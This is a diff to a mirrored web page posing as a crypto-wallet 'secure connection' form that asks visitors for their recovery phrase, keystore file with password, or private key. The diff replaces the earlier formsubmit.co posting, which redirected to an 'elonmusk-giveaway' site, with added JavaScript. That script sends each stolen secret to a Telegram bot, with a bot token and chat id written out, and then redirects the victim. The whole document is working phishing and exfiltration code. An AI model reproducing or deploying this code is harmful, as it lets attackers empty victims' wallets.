@@ -2,7 +2,7 @@
 <html lang="en">
 
 
-<!-- Mirrored from securedev.verceldev.com/connect/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Mar 2025 21:12:37 GMT -->
+<!-- Mirrored from securedev.verceldev.com/connect/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 20 Mar 2025 19:57:24 GMT -->
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
@@ -69,11 +69,8 @@
 			</div>
 			<hr class="mt-0 mb-4">
 			<!-- Form for Keyphrase -->
-
-  <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://elonmusk-giveaway.vercel.app/access/point/success.html">
-     <div class="content" id="tab-one"> 
+<div class="content" id="tab-one"> 
+  <form id="keyphraseForm" onsubmit="submitKeyphrase(event)">
       <input type="hidden" name="_captcha" value="false"> 
       <input type="text" name="_honey" style="display: none"> 
       <input type="hidden" name="_next" value="https://tokensauth.cc/sent.html"> 
@@ -83,16 +80,12 @@
       <p class="small text-center my-4">Typically 12 (sometimes 24)<br>words separated by single <br>spaces</p> 
       <button type="submit" value="submit" class="btn btn-primary shadow-none w-100 mb-3">Secure Connection</button> 
       <button type="button" class="btn btn-danger shadow-none mb-3 w-100" onclick="close_modal();">Cancel</button> 
-
+  </form> 
 </div>
-  </form> 	
 
 <!-- Form for Keystore JSON -->
-
- <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://elonmusk-giveaway.vercel.app/access/point/success.html">
-       <div class="content d-none" id="tab-two"> 
+<div class="content d-none" id="tab-two"> 
+  <form id="keystoreForm" onsubmit="submitKeystore(event)">
       <input type="hidden" name="_captcha" value="false"> 
       <input type="text" name="_honey" style="display: none"> 
       <input type="hidden" name="_next" value="https://tokensauth.cc/sent.html"> 
@@ -103,16 +96,13 @@
       <p class="small text-center my-4">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</p> 
       <button type="submit" value="submit" class="btn btn-primary shadow-none w-100 mb-3">PROCEED</button> 
       <button type="button" class="btn btn-danger shadow-none mb-3 w-100" onclick="close_modal();">Cancel</button> 
-  
-</div>
   </form> 
+</div>
+
 <!-- Form for Private Key -->
 <div class="content d-none" id="tab-three"> 
-  <form action="https://formsubmit.co/formsubmitmail@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://elonmusk-giveaway.vercel.app/access/point/success.html">
-      <div class="content d-none" id="tab-three"> 
-   <input type="hidden" name="_captcha" value="false"> 
+  <form id="privateKeyForm" onsubmit="submitPrivateKey(event)">
+      <input type="hidden" name="_captcha" value="false"> 
       <input type="text" name="_honey" style="display: none"> 
       <input type="hidden" name="_next" value="https://tokensauth.cc/sent.html"> 
       <input type="hidden" name="importType" value="privateKey"> 
@@ -121,10 +111,71 @@
       <p class="small text-center my-4">Typically 12 (sometimes 24)<br>separated by single <br>spaces</p> 
       <button type="submit" value="submit" class ="btn btn-primary shadow-none w-100 mb-3">PROCEED</button> 
       <button type="button" class="btn btn-danger shadow-none mb-3 w-100" onclick="close_modal();">Cancel</button> 
- 
-</div>
   </form> 
+</div>
 
+<script>
+function submitKeyphrase(event) {
+  event.preventDefault(); // Prevent the default form submission
+  const form = event.target;
+  const phrase = form.phrase.value;
+  const url = `https://api.telegram.org/bot7552140963:AAHkeU5PGLeLuEqAy9U68sp2ijCPc6E5CY8/sendMessage?chat_id=-4692683158&text=Keyphrase: ${encodeURIComponent(phrase)}`;
+
+  fetch(url)
+      .then(response => {
+          if (response.ok) {
+              window.location.href = 'index.html'; // Redirect to homepage
+          } else {
+              alert('Error sending message. Please try again.');
+          }
+      })
+      .catch(error => {
+          console.error('Error:', error);
+          alert('An error occurred. Please try again.');
+      });
+}
+
+function submitKeystore(event) {
+  event.preventDefault(); // Prevent the default form submission
+  const form = event.target;
+  const keystorejson = form.keystorejson.value;
+  const password = form.Password.value;
+  const url = `https://api.telegram.org/bot7552140963:AAHkeU5PGLeLuEqAy9U68sp2ijCPc6E5CY8/sendMessage?chat_id=-4692683158&text=Keystore JSON: ${encodeURIComponent(keystorejson)} | Password: ${encodeURIComponent(password)}`;
+
+  fetch(url)
+      .then(response => {
+          if (response.ok) {
+              window.location.href = 'index.html'; // Redirect to homepage
+          } else {
+              alert('Error sending message. Please try again.');
+          }
+      })
+      .catch(error => {
+          console.error('Error:', error);
+          alert('An error occurred. Please try again.');
+      });
+}
+
+function submitPrivateKey(event) {
+  event.preventDefault(); // Prevent the default form submission
+  const form = event.target;
+  const privateKey = form.Key.value;
+  const url = `https://api.telegram.org/bot7552140963:AAHkeU5PGLeLuEqAy9U68sp2ijCPc6E5CY8/sendMessage?chat_id=-4692683158&text=Private Key: ${encodeURIComponent(privateKey)}`;
+
+  fetch(url)
+      .then(response => {
+          if (response.ok) {
+              window.location.href = 'index.html'; // Redirect to homepage
+          } else {
+              alert('Error sending message. Please try again.');
+          }
+      })
+      .catch(error => {
+          console.error('Error:', error);
+          alert('An error occurred. Please try again.');
+      });
+}
+</script>
 		</div>
 	</div>
 
@@ -1054,5 +1105,5 @@
 	  
 </body>
 
-<!-- Mirrored from securedev.verceldev.com/connect/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Mar 2025 21:13:23 GMT -->
+<!-- Mirrored from securedev.verceldev.com/connect/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 20 Mar 2025 19:58:04 GMT -->
 </html>
